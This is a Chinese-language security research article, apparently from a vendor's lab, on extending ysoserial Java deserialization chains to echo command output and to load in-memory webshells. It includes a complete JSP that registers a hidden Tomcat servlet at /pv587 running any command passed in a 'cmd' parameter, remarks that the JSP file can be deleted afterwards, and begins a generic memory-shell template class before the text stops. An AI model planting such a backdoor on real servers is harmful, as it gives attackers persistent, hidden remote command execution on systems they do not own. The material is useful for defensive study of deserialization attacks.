---
title: 基于ysoserial的深度利用研究（命令回显与内存马）
url: https://www.4hou.com/posts/nJnl
source: 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com
date: 2023-03-25
fetch_date: 2025-10-04T10:34:16.834957
---

# 基于ysoserial的深度利用研究（命令回显与内存马）

基于ysoserial的深度利用研究（命令回显与内存马） - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 基于ysoserial的深度利用研究（命令回显与内存马）

盛邦安全
[技术](https://www.4hou.com/category/technology)
2023-03-24 11:44:21

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)167614

收藏

导语：命令回显与内存马研究

**0x01 前言**

很多小伙伴做反序列化漏洞的研究都是以命令执行为目标，本地测试最喜欢的就是弹计算器，但没有对反序列化漏洞进行深入研究，例如如何回显命令执行的结果，如何加载内存马。（关注“Beacon Tower Lab”烽火台实验室，为您持续输出前沿的安全攻防技术）

在上一篇文章中↓↓↓

记一次反序列化漏洞的利用之路

遇到了一个实际环境中的反序列化漏洞，也通过调试最终成功执行命令，达到了RCE的效果。在实际的攻防场景下，能执行命令并不是最完美的利用场景，内存马才是最终的目标。本篇文章就在此基础上讲一讲如何进行命令回显和加载内存马。

**0x02 回显**

在研究基于反序列化利用链的回显实现之前，首先解决基于反序列化利用链的回显实现，也就是在响应结果中输出命令执行的结果。对PHP语言熟悉的小伙伴可能会觉得这并不算问题，直接echo不就行了，java里面是不是也应该有类似的函数例如out.println()。Java是一种面向对象的编程语言，所有的操作都是基于类和对象进行，如果要在页面响应中输出内容，必须要先有HttpServletResponse对象，典型的把命令执行结果响应到页面的方式如图2.1所示。

![1679537651111929.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230323/1679538563253666.png "1679537651111929.png")

图2.1 通过HttpServletResponse对象输出命令执行结果

从图2.1可以看出最简单的命令执行，也需要比较复杂的代码逻辑，也就要求利用链中必须要支持执行复杂语句。并不是所有的ysoserial利用链都能达到回显和

内存马的效果，只有支持复杂语句的利用链才能回显和内存马，如表2.1所示。

表2.1 ysoserial利用链中对复杂语句的支持

![1679537698187977.jpeg](https://img.4hou.com/uploads/ueditor/php/upload/image/20230323/1679538564108547.jpeg "1679537698187977.jpeg")

我们先以CommonsBeanutils1利用链来进行分析，其他CommonsCollections利用链本质上是一样的，CommonsBeanutils1链和CommonsCollections链最终都是xalan库来动态加载字节码，执行复杂语句。关于xalan利用链的分析网上有很多文章，这里暂不做分析。

要实现反序列化利用链的结果回显，最重要的是要获取到HttpServletRequest对象和HttpServletResponse对象，根据目标环境的不同，获取这两个对象的办法是不一样的，如图2.2，图2.3所示。

![1679537754866091.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230323/1679538565108369.png "1679537754866091.png")

图2.2 SpringBoot环境下获取request和response对象

![1679537779179682.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230323/1679538565100713.png "1679537779179682.png")

图2.3 SpringMVC环境下获取request和response对象

不同的服务器获取这两个对象的方式不一样，其他例如Weblogic、Jboss、Websphere这些中间件获取这两个对象的方式也不一样，这种差异化极大的增加了反序列化回显和内存马实现的难度。

有没有一种比较通用的办法能够获取到request和response对象呢？答案是有的，基于Thread.CurrentThread()递归搜索可以实现通用的对象查找。目前测试环境是SpringMVC和SpringBOOT，其他环境暂未测试。

Thread.CurrentThread()中保存了当前线程中的全局信息，系统运行环境中所有的类对象都保存在Thread.CurrentThread()。用于回显需要的request和response对象可以在Thread.CurrentThread()中找到；用于内存马实现的StandardContext对象也可以找到。

递归搜索的思路就是遍历Thread.CurrentThread()下的每一个字段，如果字段类别继承自目标类（例如javax.servlet.http.HttpServletRequest），则进行标记，否则继续遍历。如图2.3的方式是在已知目标类的位置获取目标类对应对象的方式，我们的改进办法是在未知目标类位置的情况下，通过遍历的方式来发现目标类对象。

其中关键的代码如图2.4所示，完整的代码见github项目地址。其中最关键的步骤是通过递归的方式来查找Thread.CurrentThread()的所有字段，依次判断字段类型是否为javax.servlet.http.HttpServletRequest和javax.servlet.http.HttpServletResponse。

![1679537821729281.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230323/1679538566106215.png "1679537821729281.png")

图2.4 通过递归方式来查找request和response对象

使用这种方式的好处是通用性高，而不需要再去记不同服务器下对象的具体位置。把这种方式保存为一条新的利用链CommonsBeanutils1Echo，然后就可以在兼容SpringMVC和SpringBoot的环境中使用相同的反序列化包，如图2.5，图2.6所示。

![1679537849174356.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230323/1679538566227645.png "1679537849174356.png")

图2.5 生成payload

![1679537888768042.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230323/1679538567155052.png "1679537888768042.png")

图2.6 使用生成的payload进行反序列化测试

**0x03 内存马**

内存马一直都是java反序列化利用的终极目标，内存马的实现方式有很多种，其中最常见的是基于Filter的内存马，本文目标也是通过反序列化漏洞实现通用的冰蝎内存马。

基于Filter型的内存马实现步骤比较固定，如果是在jsp的环境下，可以使用下面的方式来生成内存马。

```
<%@ page import="java.io.IOException" %><%@ page import="java.io.InputStream" %><%@ page import="java.util.Scanner" %><%@ page import="org.apache.catalina.core.StandardContext" %><%@ page import="java.io.PrintWriter" %>
<%    // 创建恶意Servlet    Servlet servlet = new Servlet() {        @Override        public void init(ServletConfig servletConfig) throws ServletException {
        }        @Override        public ServletConfig getServletConfig() {            return null;        }        @Override        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {            String cmd = servletRequest.getParameter("cmd");            boolean isLinux = true;            String osTyp = System.getProperty("os.name");            if (osTyp != null && osTyp.toLowerCase().contains("win")) {                isLinux = false;            }            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();            Scanner s = new Scanner(in).useDelimiter("\\a");            String output = s.hasNext() ? s.next() : "";            PrintWriter out = servletResponse.getWriter();            out.println(output);            out.flush();            out.close();        }        @Override        public String getServletInfo() {            return null;        }        @Override        public void destroy() {
        }    };
%><%    // 获取StandardContext    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
    // 用Wrapper对其进行封装    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();    newWrapper.setName("pv587");    newWrapper.setLoadOnStartup(1);    newWrapper.setServlet(servlet);    newWrapper.setServletClass(servlet.getClass().getName());
    // 添加封装后的恶意Wrapper到StandardContext的children当中    standardCtx.addChild(newWrapper);
    // 添加ServletMapping将访问的URL和Servlet进行绑定    standardCtx.addServletMapping("/pv587","pv587");%>
```

访问上面的jsp文件，然后就可以删除文件，访问内存马了，如图3.1所示。

![1679538018616480.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230323/1679538568190640.png "1679538018616480.png")

图3.1 通过jsp文件来实现内存马

上面的代码是最初级的内存马实现，通过jsp文件来实现的命令执行的内存马。由于本文的重点不是讲内存马的原理，所以代码原理简单在注释中说明，如果需要详细的原因可以参考其他专门讲内存马的文章。在反序列化环境下实现冰蝎的内存马要比这个复杂很多，但是其中一些本质上的步骤是不变的。

内存马实现种最关键的是要获取StandardContext对象，然后基于这个对象来绑定Wrapper。不同的环境下获取StandardContext对象的方式不一样，与上面步骤回显的方式一致，也可以通过递归搜索的方式从Thread.CurrentThread()中查找，把上面内存马的实现放在递归搜索的模版中实现如下所示。

```
package ysoserial.template;

import org.apache.catalina.Context;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.catalina.deploy.FilterDef;import org.apache.catalina.deploy.FilterMap;
import javax.servlet.*;import java.io.IOException;import java.io.InputStream;import java.io.PrintWriter;import java.lang.reflect.Constructor;import java.util.HashSet;import java.lang.reflect.Array;import java.lang.reflect.Field;import java.util.*;
public class DFSMemShell {
    private HashSet set = new HashSet();    private Object standard_context_obj;    private Class s...